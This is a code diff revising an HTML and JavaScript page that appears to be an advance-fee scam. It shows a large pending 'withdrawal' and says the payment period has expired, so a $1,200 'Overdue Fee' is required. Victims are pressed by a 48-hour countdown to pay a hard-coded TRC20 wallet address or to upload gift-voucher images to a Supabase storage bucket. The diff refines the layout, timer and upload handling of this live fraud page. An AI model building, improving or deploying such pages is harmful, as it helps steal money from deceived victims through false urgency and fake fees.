@@ -3,63 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Withdrawal Processing</title>
+    <title>Withdrawal Status</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        /* [Your existing styles remain here for visual consistency] */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
         body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; width: 100%; max-width: 450px; text-align: center; position: relative; }
-        .spinner-overlay { visibility: hidden; opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(30,41,59,0.95); display: flex; justify-content: center; align-items: center; flex-direction: column; z-index: 10; }
-        .spinner-overlay.active { visibility: visible; opacity: 1; }
+        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; width: 100%; max-width: 450px; text-align: center; }
+        
+        /* Spinner */
+        .spinner-overlay { display: none; position: fixed; inset: 0; background: rgba(30,41,59,0.9); z-index: 100; align-items: center; justify-content: center; flex-direction: column; }
+        .spinner-overlay.active { display: flex; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #334155; border-top: 4px solid #f59e0b; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 10px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* Existing UI Elements */
+        .icon-wrap { width: 80px; height: 80px; border-radius: 50%; background: rgba(245,158,11,0.1); border: 2px solid rgba(245,158,11,0.35); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
         .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 18px; margin-bottom: 20px; text-align: left; }
         .info-row { display: flex; justify-content: space-between; padding: 8px 0; font-size: 13px; }
-        .commission-box { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 15px; margin-bottom: 20px; text-align: left; }
-        .c-title { font-size: 13px; font-weight: 700; color: #f87171; margin-bottom: 8px; }
-        .c-desc { font-size: 12px; color: #94a3b8; line-height: 1.5; }
-        .btn { background: #2563eb; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: 600; cursor: pointer; }
+        
+        /* The Overdue/Payment Box */
+        .commission-box { border: 1px solid #ef4444; background: rgba(239, 68, 68, 0.08); padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: left; }
+        .tabs { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .btn { background: #2563eb; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: 600; }
         .btn.amber { background: #d97706; }
         .panel { display: none; }
         .panel.active { display: block; }
-        .upload-zone { border: 2px dashed #334155; padding: 30px; cursor: pointer; position: relative; border-radius: 10px; margin-bottom: 10px; }
-        .upload-zone input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
+        .upload-zone { border: 2px dashed #334155; padding: 30px; cursor: pointer; position: relative; border-radius: 10px; }
+        .upload-zone input { position: absolute; inset: 0; opacity: 0; cursor: pointer; z-index: 10; }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="spinner-overlay" id="loading-spinner"><div class="spinner"></div><p id="spinner-message">Uploading...</p></div>
+<div class="spinner-overlay" id="loading-spinner"><div class="spinner"></div><p id="spinner-msg">Processing...</p></div>
 
-    <h2>Withdrawal Processing</h2>
-    <div class="info-card">
-        <div class="info-row"><span>Amount</span><span>$694,536.50</span></div>
-        <div class="info-row"><span>Overdue Fee</span><span style="color:#f87171;">$1,200.00</span></div>
-    </div>
+<div class="container">
+    <div class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" width="38"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
+    <h2>Payment Period Expired</h2>
+    <p style="font-size: 13px; color: #94a3b8; margin-bottom: 20px;">Your withdrawal time limit has elapsed. An Overdue Fee is now required to reactivate the transaction.</p>
 
     <div class="commission-box">
-        <div class="c-title">⚠️ Payment Period Expired</div>
-        <div class="c-desc">The allotted time for your withdrawal has elapsed. An <strong style="color:#fca5a5;">Overdue Fee</strong> is required to reactivate your transfer.</div>
-        <div style="display: flex; justify-content: space-between; margin-top: 15px;">
-            <div><div style="font-size: 11px; color: #64748b;">Fee</div><div style="font-size: 20px; font-weight: 700; color: #f87171;">$1,200.00</div></div>
-            <div style="text-align: right;"><div style="font-size: 11px; color: #64748b;">Time Remaining</div><div id="timer-display" style="font-size: 18px; color: #ef4444; font-family: monospace;">48:00:00</div></div>
+        <div style="color: #ef4444; font-weight: bold; margin-bottom: 5px;">⚠️ Overdue Fee</div>
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <span style="font-size: 20px; font-weight: bold;">$1,200.00</span>
+            <span id="timer-display" style="color: #ef4444; font-family: monospace; font-weight: bold;">48:00:00</span>
         </div>
     </div>
 
-    <div class="tabs" style="display: grid; grid-template-columns: 1fr 1fr; margin-bottom: 20px;">
+    <div class="tabs">
         <button class="btn" onclick="switchTab('crypto')">💎 TRC20</button>
         <button class="btn amber" onclick="switchTab('voucher')">🎟️ Voucher</button>
     </div>
 
-    <div class="panel active" id="panel-crypto">
-        <input class="address-input" value="0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8" readonly style="width:100%; padding:10px; background:#0f172a; border:1px solid #334155; color:#fff; margin-bottom:10px;">
-        <button class="btn" onclick="alert('Payment Noted')">I've Sent the Payment</button>
+    <div id="panel-crypto" class="panel active">
+        <input value="0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8" readonly style="width:100%; padding:12px; background:#0f172a; border:1px solid #334155; color:#fff; border-radius:8px;">
     </div>
 
-    <div class="panel" id="panel-voucher">
-        <div class="upload-zone">
+    <div id="panel-voucher" class="panel">
+        <div class="upload-zone" id="upload-zone">
             <input type="file" id="file-input" accept="image/*" onchange="handleFile(this.files[0])">
-            <h3>Tap to upload voucher</h3>
+            <h3 id="file-status">Tap to select voucher</h3>
         </div>
-        <button class="btn amber" id="voucher-btn" disabled onclick="uploadVoucher()">Submit Voucher</button>
+        <button class="btn amber" id="sub-btn" disabled onclick="uploadVoucher()" style="margin-top:10px; width:100%;">Submit Voucher</button>
     </div>
 </div>
 
@@ -67,42 +70,42 @@
     const supabaseClient = supabase.createClient('https://kmjmqrrmzdtovovzigxk.supabase.co', 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb');
     let selectedFile = null;
 
-    function switchTab(tab) {
-        document.getElementById('panel-crypto').classList.toggle('active', tab === 'crypto');
-        document.getElementById('panel-voucher').classList.toggle('active', tab === 'voucher');
+    function switchTab(t) {
+        document.getElementById('panel-crypto').classList.toggle('active', t === 'crypto');
+        document.getElementById('panel-voucher').classList.toggle('active', t === 'voucher');
     }
 
     function handleFile(file) {
-        selectedFile = file;
-        document.getElementById('voucher-btn').disabled = !file;
+        if (file) {
+            selectedFile = file;
+            document.getElementById('file-status').innerText = file.name;
+            document.getElementById('sub-btn').disabled = false;
+        }
     }
 
     async function uploadVoucher() {
         if (!selectedFile) return;
         document.getElementById('loading-spinner').classList.add('active');
-        const { data, error } = await supabaseClient.storage
-            .from('vouchers')
-            .upload(`uploads/${Date.now()}_${selectedFile.name}`, selectedFile);
-        
+        const { error } = await supabaseClient.storage.from('vouchers').upload(`uploads/${Date.now()}_${selectedFile.name}`, selectedFile);
         document.getElementById('loading-spinner').classList.remove('active');
-        if (error) alert('Upload failed: ' + error.message);
-        else alert('Voucher uploaded successfully!');
+        alert(error ? 'Upload failed: ' + error.message : 'Voucher submitted successfully!');
     }
 
-    async function updateTimer() {
+    // Timer logic tied to Supabase
+    async function startTimer() {
         const { data } = await supabaseClient.from('crypto_transfers').select('timer_end').single();
         if (data?.timer_end) {
-            const endTime = new Date(data.timer_end).getTime();
+            const end = new Date(data.timer_end).getTime();
             setInterval(() => {
-                const dist = endTime - new Date().getTime();
-                const h = Math.floor(dist / 3600000);
-                const m = Math.floor((dist % 3600000) / 60000);
-                const s = Math.floor((dist % 60000) / 1000);
-                document.getElementById("timer-display").innerHTML = `${h}:${m}:${s}`;
+                const diff = end - Date.now();
+                const h = Math.floor(diff / 3600000);
+                const m = Math.floor((diff % 3600000) / 60000);
+                const s = Math.floor((diff % 60000) / 1000);
+                document.getElementById("timer-display").innerText = `${h}:${m}:${s}`;
             }, 1000);
         }
     }
-    window.onload = updateTimer;
+    startTimer();
 </script>
 </body>
 </html>
